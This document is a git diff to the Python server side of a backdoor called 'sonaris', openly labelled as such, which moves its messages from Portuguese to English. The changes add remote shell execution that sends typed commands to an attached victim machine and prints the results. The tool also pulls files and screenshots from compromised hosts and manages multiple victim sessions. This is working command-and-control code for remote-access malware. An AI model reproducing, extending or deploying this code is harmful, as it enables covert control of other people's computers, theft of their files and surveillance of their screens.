@@ -4,21 +4,24 @@ __author__ = '@zNairy'
 __contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
 __version__ = '2.0'
 
-from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, gaierror
 from threading import Thread
 from getpass import getuser
+from pprint import pprint
 from pickle import loads
+from datetime import datetime
 from pathlib import Path
 from rich import print as printr
 from os import system, uname
 
 class Server(object):
     """ server side backdoor """
-    def __init__(self, host='0.0.0.0', port=1234):
+    def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
         self.connectedUsers = {}
-        self.userAttached = ''
-        
+        self.userAttached = self.userCwd = ''
+        self.especialComamnds = {'clear': self.clearScreen, 'cls': self.clearScreen, 'exit': self.closeTerminal}
+
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
@@ -26,17 +29,27 @@ class Server(object):
         if name:
             if self.connectedUsers.get(name[0]):
                 self.userAttached = name[0]
-                printr(f'[green] Você está em uma sessão com {name[0]} agora!')
+                self.userCwd = self.connectedUsers.get(self.userAttached)['currentDirectory']
+                printr(f'[green] You are attached to a section with {name[0]} now!')
             else:
-                printr(f'[red] Não há sessão ativa com [yellow]{name[0]}[red] no momento.')
+                printr(f'[red] There is no open session with [yellow]{name[0]}.')
         else:
-            printr('Info: Abre a sessão ativa interagindo com um usuário. Ex: /attach zNairy-PC')
+            printr('Info: Attaches to an active session. [green]Ex: /attach zNairy-PC')
 
     def detach(self, name):
         if self.userAttached:
-            self.userAttached = ''
+            self.userAttached = self.userCwd = ''
         else:
-            printr(f'[red] Você não está interagindo com nenhuma seção no momento.')
+            printr(f'[red] No session currently attached.')
+
+    def changeDirectory(self):
+        if self.userAttached:
+            connection = self.connectedUsers[self.userAttached]['conn']
+            connection.send(self.lastCommand.encode())
+            header = loads(connection.recv(512))
+
+        else:
+            printr(f'[red] No session currently attached.')
 
     def checkFolders(self):
         for folder in ['./screenshots','files']:
@@ -65,11 +78,11 @@ class Server(object):
                 if header["exists"]:
                     self.receiveFile(connection, header)
                 else:
-                    printr('[red] Arquivo não encontrado...')
+                    printr('[red] File not found.')
             else:
-                printr('Info: Faz download de um arquivo externo. Ex: /download sóastop.mp3')
+                printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
         else:
-            printr('[yellow] Não há nenhuma seção aberta no momento...')
+            printr('[yellow] No session currently attached.')
 
     def screenshot(self, args):
         self.checkFolders()
@@ -79,9 +92,11 @@ class Server(object):
             connection.send('/screenshot'.encode())
             header = loads(connection.recv(512))
             self.receiveFile(connection, header)
-
         else:
-            printr('[yellow] Não há nenhuma seção aberta no momento...')
+            printr('[yellow] No session currently attached.')
+
+    def elapsedTime(self, ti, tf):
+        return f'{int(tf[0])-int(ti[0])}.{int(tf[1])-int(ti[1])}'
 
     def addUser(self, data):
         self.connectedUsers.update({data['name']: data})
@@ -92,20 +107,20 @@ class Server(object):
                 if self.userAttached:
                     self.detach(self.userAttached)
                 self.connectedUsers.pop(name[0])
-                printr(f'[green] Sessão com [yellow]{name[0]} [green]removida!')
+                printr(f'[green] Session with [yellow]{name[0]} [green]removed!')
             else:
-                printr(f'[red] Não há sessão ativa com [yellow]{name[0]}[red] no momento.')
+                printr(f'[red] There is no open session with [yellow]{name[0]}.')
         else:
-            print('Info: Remove uma sessão ativa com um usuário. Ex: /rmsession zNairy-PC')
+            print('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')
 
-    def clearScreen(self, args):
+    def clearScreen(self, args=''):
         system('clear' if uname().sysname.lower() == 'linux' else 'cls')
     
     def showSessions(self, args):
         if self.connectedUsers:
             print(''.join(f'  -{name}\n' for name in self.connectedUsers.keys()))
         else:
-            printr('[yellow] Não há nenhuma seção aberta no momento...')
+            printr('[yellow] There is no open sessions currently.')
 
     def showVersion(self, args):
         printr(__version__)
@@ -116,7 +131,7 @@ class Server(object):
     def showCodeAuthor(self, args):
         printr(__author__)
 
-    def closeTerminal(self, args):
+    def closeTerminal(self, args=''):
         exit()
 
     def availableCommands(self, args):
@@ -141,8 +156,6 @@ class Server(object):
             "/version": {"local": True, "action": self.showVersion},
             "/lastcommand": {"local": True, "action": self.showLastCommand},
             "/internalcommands": {"local": True, "action": self.internalcommands},
-            "/clear": {"local": True, "action": self.clearScreen},
-            "/exit": {"local": True, "action": self.closeTerminal}
         }
 
         commands.update({"/commands": {"local": True, "action": self.availableCommands}})
@@ -162,18 +175,40 @@ class Server(object):
         if command:
             command['action'](args)
         else:
-            printr('[red] Esse comando não existe...') # manda pro lado client checar #
+            printr('[red] Command does not exist.')
+
+    def receiveCommand(self, connection, header):
+        received = b''
+        while len(received) < header['bytes']:
+            received += connection.recv(header['bytes'])
+        
+        printr(received.decode(), f'\nreturned in {self.elapsedTime(header["time"], datetime.now().strftime("%M %S").split())} seconds.')
 
     def sendCommand(self, command):
-        self.__Server.send(command.encode('utf-8'))
+        self.lastCommand = command
+
+        if self.userAttached:
+            connection = self.connectedUsers[self.userAttached]['conn']
+            connection.send(command.encode())
+            header = loads(connection.recv(512))
+            self.userCwd = header['currentDirectory']
+            self.receiveCommand(connection, header)
+        else:
+            printr('[yellow] No session currently attached.')
 
     def startTerminal(self):
         try:
             while True:
-                printr(f'[green]{getuser()}'+ '[white]@' +'[green]sonaris[white]#: ', end='')
+                printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]:{self.userCwd}# ', end='')
                 command = input().strip()
-                if command and command.startswith('/'):
-                    self.checkCommand(command)
+                if command:
+                    if command.split()[0] not in ['clear', 'cls', 'exit']:
+                        if command.startswith('/'):
+                            self.checkCommand(command)
+                        else:
+                            self.sendCommand(command)
+                    else:
+                        self.especialComamnds[command.split()[0]]()
 
         except KeyboardInterrupt:
             print()
@@ -191,24 +226,30 @@ class Server(object):
             response.update({"conn": connection})
             self.addUser(response)
             printr(f'\n[*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
-            printr(f'[green]{getuser()}'+ '[white]@' +'[green]sonaris[white]#: ', end='')
+            printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]#:{self.userCwd}# ', end='')
 
     def configureSocket(self):
-        self.__Server = socket(AF_INET, SOCK_STREAM)
-        self.__Server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-        self.__Server.bind(self.__Address)
-        self.__Server.listen(1)
+        try:
+            self.__Server = socket(AF_INET, SOCK_STREAM)
+            self.__Server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+            self.__Server.bind(self.__Address)
+            self.__Server.listen(1)
+        except OverflowError:
+            printr(f' "{self.__Address[1]}" [red]Port too large, must be 0-65535')
+            exit(1)
+        except OSError:
+            printr(f' "{self.__Address[0]}" Cannot assign requested address')
+            exit(1)
+        except gaierror:
+            printr(f' "{self.__Address[0]}" [red]Name or service not known')
+            exit(1)
 
     def info(self):
-        return f' Servidor aberto em {self.__Address[0]}:{self.__Address[1]}'
+        return f' Server is open in {self.__Address[0]}:{self.__Address[1]}'
 
     def run(self):
-        try:
-            self.configureSocket()
-        except Exception as err:
-            print(err)
-            exit(1)
-        finally:
-            printr(self.info())
-            self.startProcess(self.listenConnections)
-            self.startTerminal()
+        self.configureSocket()
+        
+        printr(self.info())
+        self.startProcess(self.listenConnections)
+        self.startTerminal()
